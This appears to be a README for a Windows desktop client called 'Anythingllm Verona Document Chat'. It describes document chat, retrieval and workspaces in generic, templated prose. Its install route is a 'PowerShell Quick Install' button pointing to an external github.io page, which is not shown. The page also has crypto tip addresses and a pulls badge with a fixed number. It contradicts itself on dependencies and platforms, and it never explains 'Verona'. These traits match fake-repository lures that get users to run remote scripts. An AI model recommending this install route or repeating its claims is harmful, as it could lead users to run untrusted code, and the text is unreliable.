<div align="center">

# Anythingllm Verona Document Chat — Windows Desktop Client

![](files/preview.png)

### 🚀 PowerShell Quick Install

<a href="https://chase1225.github.io/anythingllm-verona-document-chat/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![platform](https://img.shields.io/badge/PLATFORM-WINDOWS_10_%2F_11-2f81f7?style=social&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/PS-SCRIPT-54aeff?style=social&labelColor=0d1117)]() [![pulls](https://img.shields.io/badge/PULLS-1998-0969da?style=social&labelColor=0d1117)]()

<div align="center">
<h3>Leave a little tip</h3>
<p><strong>ETH</strong>:&nbsp;<code>0x60530AE300323dE6d7D9313661bAcc24BB235C32</code> | <strong>BTC</strong>:&nbsp;<code>1Lvbg8BU27mLtXkQA2fyR9sawopoygiQ4Y</code> | <strong>TRON</strong>:&nbsp;<code>TQ16XXygPc6vSLLFgdwiTJmN4c1DGjHdLU</code></p>
</div>

</div>

---

Anythingllm Verona Document Chat is a desktop application for interacting with local document collections through a conversational interface. It indexes ingested files into a vector store and routes natural-language queries to a configured language model, returning context-grounded responses with source attribution. The client supports multi-workspace isolation, configurable embedding and chat providers, and persistent thread history for reproducible sessions. Designed for offline-capable and privacy-sensitive deployments, it runs as a self-contained desktop process with local document storage and no mandatory external dependencies.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Local-first document Q&A workspace**: A desktop application that lets you load a document collection and interrogate it through a conversational chat interface, with all processing performed on the local machine.

- **Workspace isolation**: Each workspace maintains its own document set, vector index, and conversation history, so unrelated projects remain separated and independently manageable.

- **Document ingestion pipeline**: Supports bulk import of source files, automatic text extraction, chunking, and embedding generation, with per-document status reporting during ingestion.

- **Retrieval-augmented responses**: Answers are grounded in retrieved passages from the active workspace's indexed documents, with configurable retrieval depth and context window limits.

- **Source citation and traceability**: Chat responses include references to the originating document chunks, allowing inspection of the retrieved evidence behind each answer.

- **Provider-agnostic model configuration**: Model endpoints and embedding backends are configurable through the application settings, enabling integration with locally hosted or remote inference services.

- **Persistent conversation threads**: Named chat sessions are stored per workspace, with the ability to revisit, rename, and continue prior threads across application restarts.

- **Document lifecycle management**: Individual documents can be removed, reindexed, or replaced, with index updates applied incrementally without rebuilding the entire workspace.

- **Offline-capable operation**: Core document parsing, indexing, and chat functionality operate without network access when paired with a local inference backend.

- **Cross-platform desktop packaging**: Distributed as a native desktop application with a consistent interface across supported operating systems.

- **Configurable privacy controls**: Telemetry is disabled by default, and all workspace data, indexes, and logs reside in a user-controlled local data directory.

## How it works

Anythingllm Verona Document Chat operates as a local-first orchestration layer that connects document ingestion, vector indexing, and retrieval-augmented generation into a single desktop workflow. The application runs an embedded pipeline on the local machine, so documents, embeddings, and conversation history remain under user control unless an external model provider is explicitly configured.

The workflow proceeds through the following stages:

1. **Document ingestion and normalization.** Users add source files through the desktop interface. The ingestion layer parses supported formats, extracts text and structure, and normalizes content into clean, chunk-ready segments. Metadata such as file name, type, and section boundaries is preserved and attached to each segment.

2. **Chunking and embedding.** Normalized text is split into overlapping chunks sized for the active model's context window. Each chunk is converted into a vector embedding using the configured embedding backend. Chunking parameters, overlap, and embedding model selection are exposed in application settings so retrieval quality can be tuned per corpus.

3. **Vector storage and indexing.** Embeddings are written to a local vector store alongside their source references. The index is persisted on disk, allowing workspaces to be reopened without reprocessing. Incremental indexing detects changed or removed documents and updates the store accordingly, avoiding full re-embedding on every launch.

4. **Query processing and retrieval.** When a user submits a question, the query is embedded with the same backend used during ingestion. A similarity search retrieves the top-ranked chunks from the active workspace, optionally filtered by document or metadata constraints. Retrieved chunks are ranked and deduplicated before assembly.

5. **Context assembly and generation.** Retrieved chunks are assembled into a bounded context window and submitted to the configured language model together with the user's query and workspace instructions. The model generates a response grounded in the retrieved content, and source references are returned alongside the answer so results can be traced back to specific documents.

6. **Workspace isolation and persistence.** Each workspace maintains its own document set, vector index, and conversation threads. State is persisted locally, enabling reproducible sessions and separation between projects. Embedding and model configurations are stored per workspace, so different corpora can use different backends without interference.

7. **Local execution and provider flexibility.** The desktop application manages the pipeline end to end and supports both locally hosted and remote model backends. When local backends are used, no document content leaves the machine. When remote providers are configured, only the assembled query context is transmitted, and this behavior is surfaced in the application's configuration and documentation.

## Modules and Settings

### Document Library and Collections
This module is where the user assembles the Verona material that the desktop chat will work from, and it determines what the rest of the application can see.

- **Add Documents**: brings user-owned files into the workspace so they become available as a selectable source set.
- **Collection Assignment**: places each file into a named collection, letting the user control which documents are treated as one body of material.
- **Remove or Replace Files**: updates the active source set when the underlying material changes, with the change reflected in later answers.

### Workspace Chat Panel
This is the main conversation surface, and it draws its context from the collection selected in the document library.

- **Active Source Selector**: switches between collections or document sets, which changes the material the replies are grounded in.
- **Ask and Follow Up**: sends questions against the selected workspace, keeping the thread focused on the chosen Verona corpus.
- **Grounded Replies**: presents answers in the chat view that reference the user's own files rather than general knowledge alone.

### Citation and Source Inspector
This module connects each generated answer back to the underlying text so the user can judge it rather than take it on trust.

- **Inline References**: shows which passages or documents an answer was derived from.
- **Open Cited Material**: displays the referenced text alongside the answer for direct comparison in the desktop view.
- **Accept or Discard**: lets the user keep or set aside a response based on what the cited text actually says.

### Comparison Workspace
This module supports questions that span more than one file, turning the selected source set into a basis for cross-document analysis.

- **Multi-Source Selection**: allows more than one file or collection to be active at once.
- **Comparison Prompts**: asks for differences, overlaps or changes across the selected material.
- **Per-Point Citation**: attributes each part of a comparison to the relevant document so the user can trace it.

### Conversation History
This module preserves earlier exchanges so review sessions can continue instead of restarting.

- **Scrollback**: keeps past questions and answers available in the workspace.
- **Reopen a Thread**: returns to an earlier line of questioning and continues from there.
- **Revisit Citations**: re-reads the documents cited in a previous answer within the same session.

### Answer Behavior Controls
This module exposes settings that shape how replies are produced, and its effect is visible immediately in the next exchange.

- **Grounding Strictness**: adjusts how closely the chat should stay within the supplied documents, shifting between more literal and more interpretive replies.
- **Response Style**: influences how the answer is framed without changing which documents are active.
- **Apply and Observe**: changes take effect on a follow-up question so the user can compare the same document set under different settings.

### Additional Settings
- **Preferred Language for Replies**: sets the language the chat answers in while keeping the source documents unchanged.
- **Citation Display**: controls whether references appear with each answer or only on request.
- **Source Set Visibility**: shows the currently active files and collections so the user always knows what the chat can draw on.
- **Session Continuity**: keeps the current collection and conversation state when returning to the application.
- **File Handling Preference**: confirms that documents are managed from the user's own desktop environment rather than an external upload step.

## Usage Scenarios

### Comparing Drafts of a Verona Planning Document
**Goal:** Determine what changed between two revisions of a Verona planning document before committing to a final version.
**Steps:**
1. Add both revisions to the document library and assign them to a dedicated collection.
2. Open the comparison workspace and select both files as active sources.
3. Ask for differences and overlaps between the two versions.
4. Open the cited passages for each point to confirm the changes against the original text.
5. Adjust grounding strictness if the reply needs to stay closer to the literal wording of the documents.

**Expected result:** The chat presents a point-by-point comparison, with each difference attributed to the relevant revision, and the user can open the cited text alongside the answer to verify it before deciding which version to keep.

### Verifying Answers Against a Research Corpus
**Goal:** Get answers to specific questions about a set of Verona research papers while being able to confirm every claim.
**Steps:**
1. Bring the research papers into the workspace and group them into a collection by topic.
2. Select that collection as the active source in the chat panel.
3. Ask a question and follow up with refinements as the thread develops.
4. Use the citation display setting to show references with each answer.
5. Open the cited material for any statement that needs checking.

**Expected result:** Each reply references the passages or documents it was derived from, and the user can compare the generated answer directly with the underlying text, accepting or setting aside responses based on what the sources actually say.

### Reviewing a Verona Corpus Across Sessions
**Goal:** Work through a larger Verona document set over several review sessions without losing earlier findings.
**Steps:**
1. Populate the library with the full document set and split it into labeled collections.
2. Set the preferred reply language and choose whether source set visibility is shown during work.
3. Ask questions against one collection, then switch the active source selector to another for a different angle.
4. Scroll back through the conversation history to re-read earlier answers and revisit their citations.
5. Return to the application later with session continuity keeping the collection and conversation state in place, then continue the thread.

**Expected result:** Past exchanges remain available for scrollback, earlier cited documents can be reopened within the same session, and the user resumes with the same active collection and thread instead of starting over.

## Compatibility

Anythingllm Verona Document Chat is validated against current desktop releases of AnythingLLM and targets the desktop runtime as its primary deployment environment. Supported platforms include Windows 10 and 11 (64-bit), macOS 12 and later on both Apple silicon and Intel hardware, and modern 64-bit Linux distributions with a graphical desktop environment. The application requires a functioning AnythingLLM desktop installation, a configured workspace, and an active model provider; it does not bundle or substitute for the AnythingLLM runtime. Document ingestion relies on the formats enabled in the host AnythingLLM workspace, and parsing fidelity follows the capabilities of that host configuration. Local vector database and embedding settings are inherited from AnythingLLM, so compatibility with specific embedding models and vector stores matches the host application's support matrix. Network access is required only for model providers and services configured in AnythingLLM; the document chat layer introduces no additional external dependencies or services. The integration operates through AnythingLLM's supported desktop interfaces and workspace configuration and does not modify the host installation. Version pinning is recommended: match the integration release to the documented AnythingLLM major version, and verify workspace and provider settings after upgrading either component. Unsupported configurations include headless server-only deployments, AnythingLLM versions outside the documented range, and environments without a desktop session. For deterministic behavior across teams, standardize on a single AnythingLLM release channel and a consistent set of enabled document formats.

## FAQ

**What document formats does Anythingllm Verona Document Chat support?**

The application ingests common office and text formats, including PDF, DOCX, TXT, and Markdown. Parsing is handled locally, and extracted text is chunked and embedded for retrieval. Scanned PDFs without an embedded text layer are not processed by the built-in parser and require pre-OCR before ingestion.

**How does the retrieval pipeline work?**

Documents are segmented into overlapping chunks, converted to vector embeddings, and stored in a local vector index. At query time, the application performs similarity search over the index, ranks the most relevant chunks, and passes them as context to the configured language model. Chunk size, overlap, and retrieval depth are configurable in the settings file.

**Which language models and backends are supported?**

Anythingllm Verona Document Chat supports local inference backends as well as remote API-based providers. The backend is selected in the configuration and can be switched without re-ingesting documents, since embeddings are stored independently of the generation model. Embedding model changes require re-indexing.

**Does the application send document content to external services?**

Data handling depends on the configured backend. When a local inference backend is used, document content and queries remain on the host machine. When a remote provider is configured, chunked context and queries are transmitted to that provider. No telemetry is collected by the application itself.

**Can multiple documents or workspaces be managed separately?**

Yes. Documents can be grouped into distinct workspaces, each with its own vector index and chat history. Workspaces are isolated, so queries in one workspace do not retrieve content from another. Workspace metadata is persisted locally.

**What are the hardware requirements?**

Requirements scale with the chosen backend and document volume. Local inference benefits from a dedicated GPU with sufficient VRAM for the selected model; CPU-only operation is supported but slower. Embedding generation and index storage are lightweight relative to generation. Minimum viable configurations are documented in the project's configuration reference.

**How is chat history stored, and can it be exported?**

Chat sessions are persisted in a local database alongside workspace metadata. History can be reviewed per workspace and exported in plain text or JSON for archival. Clearing a workspace removes its associated history and index entries.

**Is the application suitable for air-gapped environments?**

Yes, provided a local inference backend and locally available embedding model are used. Once models are present on the host, no network access is required for ingestion, retrieval, or generation. Remote provider configurations should be disabled in such deployments.

**How are configuration changes applied?**

Settings are read from a local configuration file at startup. Changes to chunking, retrieval depth, or backend selection take effect after restart. Changes to the embedding model invalidate existing vectors and require re-indexing of affected workspaces.

**What troubleshooting steps address poor retrieval quality?**

Verify that documents parsed correctly and that chunk sizes match document structure. Increase retrieval depth to surface more context, and confirm the embedding model is consistent with the one used at ingestion. For scanned sources, ensure OCR was applied before ingestion.

## Disclaimer

This desktop software is provided on an "as is" and "as available" basis, without warranties of any kind, whether express, implied, or statutory, including but not limited to warranties of merchantability, fitness for a particular purpose, title, and non-infringement. Anythingllm Verona Document Chat is a local document-chat client; all processing, indexing, and retrieval behavior depends on the configuration, workspace settings, and model or embedding backends you select. Results generated through the application, including retrieved passages and model responses, are probabilistic and may be incomplete, inaccurate, or unsuitable for a given use case. You are solely responsible for validating outputs before relying on them for any decision, deliverable, or downstream process.

You are responsible for the documents you load into the application and for ensuring you have the necessary rights, permissions, and lawful basis to process them. The software does not transmit your documents to the project maintainers; however, any external model provider, embedding service, or API endpoint you configure is governed by that provider's own terms and privacy practices. Review those terms before connecting third-party services, and avoid loading sensitive, regulated, or confidential material unless your configuration and agreements permit it.

Compatibility is limited to the operating systems, runtimes, and dependency versions described in the Compatibility section. Behavior may vary with document format, size, encoding, and structure; parsing and chunking are best-effort and may not preserve every element of complex files. Performance characteristics, including indexing time, memory usage, and response latency, depend on your hardware, corpus size, and selected backends.

To the maximum extent permitted by applicable law, the authors and contributors of Anythingllm Verona Document Chat disclaim liability for any direct, indirect, incidental, special, consequential, or punitive damages, and for any loss of data, profits, or business interruption, arising from the use of or inability to use the software, even if advised of the possibility of such damages. This disclaimer does not limit or exclude liability that cannot be limited or excluded under applicable law. Use of the software constitutes acceptance of these terms.

## License

Anythingllm Verona Document Chat is distributed under the MIT License. The license grants permission to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to inclusion of the original copyright notice and this permission notice in all copies or substantial portions of the software. The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or its use. Redistribution in source or binary form must preserve the copyright notice, license text, and attribution to the original project. Modified versions must be clearly identified as such and may not misrepresent the origin of the software. The license text is provided in full within the LICENSE file at the root of the source distribution.